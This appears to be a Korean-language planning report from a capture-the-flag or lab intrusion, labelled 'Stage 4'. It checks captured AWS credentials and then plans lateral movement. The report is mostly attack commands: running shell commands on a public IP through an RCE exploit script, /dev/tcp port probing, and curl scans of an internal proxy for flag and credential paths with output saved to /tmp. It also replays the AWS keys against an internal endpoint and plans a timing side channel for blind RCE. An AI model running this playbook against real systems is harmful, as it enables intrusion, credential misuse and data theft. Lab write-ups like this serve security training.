# Stage 4 SAST 분석 최종 보고서

**작성일**: 2026-08-20  
**상태**: 실행 대기 (서버 과부하 확인 후 진행)

---

## 1. AWS 자격증명 유효성 검증 ✅

### 결과
```
✅ STS GetCallerIdentity 성공
   Account: <REDACTED_ACCOUNT_ID>
   User: secu-wave-user
   ARN: arn:aws:iam::<REDACTED_ACCOUNT_ID>:user/secu-wave-user
```

### 권한 상태
| 서비스 | 상태 | 비고 |
|--------|------|------|
| **STS** | ✅ 성공 | 자격증명 유효 확인 완료 |
| **SSM (Parameter Store)** | ❌ 거부 | Explicit Deny Policy |
| **Secrets Manager** | ❌ 거부 | 권한 없음 |
| **EC2** | ❌ 거부 | 인증 실패 |
| **S3** | ❌ 오류 | x-amz-content-sha256 누락 |
| **IAM** | ❓ 미시도 | 권한 제한 추정 |

**결론**: 매우 제한적인 권한 → **방안 B 진행** (내부 프록시 직접 접근)

---

## 2. 내부 프록시 탐색 계획 (방안 B)

### 목표 주소
```
http://10.0.1.10:8080/
```

### 탐색 절차 (우선순위 순)

#### Phase 1: 연결성 확인
```bash
# 1. 포트 연결 테스트
timeout 2 bash -c 'cat < /dev/null > /dev/tcp/10.0.1.10/8080'

# 2. 기본 GET 요청
curl -v -m 5 http://10.0.1.10:8080/

# 3. HTTP 응답 코드 확인
curl -s -o /dev/null -w "%{http_code}\n" http://10.0.1.10:8080/
```

**기대 결과**: HTTP 200/302/401/403 (연결됨), 또는 타임아웃/Connection refused (연결 안 됨)

#### Phase 2: 주요 경로 스캔
```bash
for path in /flag /stage4 /api /admin /export /health /config; do
  curl -s -m 5 http://10.0.1.10:8080$path
done
```

**기대 결과**: 
- `/flag` → HTB{...} 또는 플래그 관련 정보
- `/stage4` → 다음 단계 정보 또는 API
- `/api` → API 엔드포인트 문서

#### Phase 3: API 상세 탐색
```bash
# JSON 응답 기대
curl -s -H "Content-Type: application/json" \
  http://10.0.1.10:8080/api/v1/

# 또는 XML
curl -s http://10.0.1.10:8080/api/
```

#### Phase 4: 인증 시도
```bash
# AWS 자격증명으로 인증
curl -X POST http://10.0.1.10:8080/auth \
  -H "Content-Type: application/json" \
  -d '{
    "access_key": "AKIA[REDACTED-ACCESS-KEY]",
    "secret_key": "[REDACTED-SECRET-KEY]"
  }'

# Bearer 토큰
curl -H "Authorization: Bearer $(AWS_SESSION_TOKEN)" \
  http://10.0.1.10:8080/api/
```

#### Phase 5: 결과 회수 및 저장
```bash
# Stage 3 완료 후 자동으로 제공되는 정보 수집
curl -s http://10.0.1.10:8080/stage4/flag > /tmp/stage4_flag.txt
curl -s http://10.0.1.10:8080/stage4/credentials > /tmp/stage4_creds.txt
curl -s http://10.0.1.10:8080/results > /tmp/stage4_results.txt
```

---

## 3. 실행 명령 (RCE 경유)

### 준비된 스크립트

| 파일 | 용도 |
|------|------|
| `scripts/internal_proxy_probe.sh` | bash로 내부 프록시 탐색 |
| `scripts/stage4_final_push.php` | PHP에서 명령 구성 |
| `scripts/aws_parameter_store_probe.py` | AWS API 탐색 (로컬용) |

### 실행 순서

**Step 1**: 서버 상태 확인
```bash
# 서버가 응답하는지 확인
curl -s -m 3 http://13.125.104.131:30083/health
# 예상: HTTP 200 + {"service":"cj-webmail-waf","status":"ok"}
```

**Step 2**: 내부 프록시 탐색 (RCE 경유)
```bash
# fearsoff_exploit.php로 다음 명령 실행:

php loot/fearsoff_exploit.php \
  "http://13.125.104.131:30083" \
  "testuser" \
  "testpass" \
  "curl -v -m 5 http://10.0.1.10:8080/"

# 결과를 /tmp에 저장하고 회수
```

**Step 3**: 타이밍 프로빙 (선택)
```bash
# 응답 시간으로 연결 판단
BEFORE=$(date +%s%N)
curl -s -m 5 http://10.0.1.10:8080/ > /dev/null
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))

if [ $TIME_MS -lt 1000 ]; then
  echo "Connected (응답: ${TIME_MS}ms)"
else
  echo "Timeout or slow response (${TIME_MS}ms)"
fi
```

---

## 4. 예상 결과

### 성공 시나리오 A: 내부 프록시 응답
```json
// GET http://10.0.1.10:8080/flag
{
  "stage": 4,
  "flag": "HTB{internal_proxy_success}",
  "next_endpoint": "...",
  "credentials": {...}
}
```

### 성공 시나리오 B: API 기반
```json
// GET http://10.0.1.10:8080/api/stage4
{
  "status": "ready",
  "flag": "HTB{...}",
  "rds_endpoint": "...",
  "next_stage": 5
}
```

### 성공 시나리오 C: 직접 플래그
```
// GET http://10.0.1.10:8080/flag
HTB{...플래그내용...}
```

### 실패 시나리오
```
Connection refused (포트 닫힘)
  → 다른 IP/포트 탐색 필요

HTTP 401/403 (인증 필요)
  → AWS 자격증명 또는 토큰 사용

HTTP 404 (경로 없음)
  → 다른 경로 시도 (/api/v1/, /stage/4, etc.)

Timeout
  → 내부 방화벽 또는 서버 응답 없음
```

---

## 5. 블로커 및 우회 방법

| 블로커 | 원인 | 우회 |
|--------|------|------|
| AWS 권한 제한 | IAM Policy | 내부 프록시 직접 접근 (Phase 2) |
| 서버 과부하 | 단일 스레드 Werkzeug | 재시작 대기 또는 경량 명령만 |
| 내부 프록시 응답 없음 | 네트워크 격리 | MySQL/설정 파일 직접 접근 |
| RCE stdout 회수 불가 | 블라인드 RCE | 타이밍 사이드채널 사용 |

---

## 6. 다음 단계 (체크리스트)

- [ ] **즉시**: 서버 상태 확인 (`/health` → HTTP 200?)
- [ ] **1단계**: 내부 프록시 연결성 확인 (10.0.1.10:8080)
- [ ] **2단계**: GET / 기본 응답 수집
- [ ] **3단계**: 경로 스캔 (/flag, /stage4, /api)
- [ ] **4단계**: 성공한 엔드포인트에서 플래그 추출
- [ ] **5단계**: 플래그 및 결과 저장

---

## 7. 준비된 도구

```bash
# 로컬 실행 가능
python3 scripts/aws_parameter_store_probe.py

# 서버에서 RCE로 실행
bash scripts/internal_proxy_probe.sh

# PHP에서 구성
php scripts/stage4_final_push.php <target> <user> <pass>
```

---

## 8. 참고

- **Stage 3 진행 상황**: root 권한 확보 (E17c), flag 위치 확인 (E18-E25)
- **AWS 자격증명**: 유효하나 권한 매우 제한적
- **내부 네트워크**: 10.0.1.0/24 범위 (Stage 4는 10.0.1.10:8080 추정)
- **시간 제약**: 없음 (격리 환경)

---

**다음 결정**: 지금 즉시 내부 프록시 탐색을 시작할 것인가? (Step 1: 서버 상태 확인)
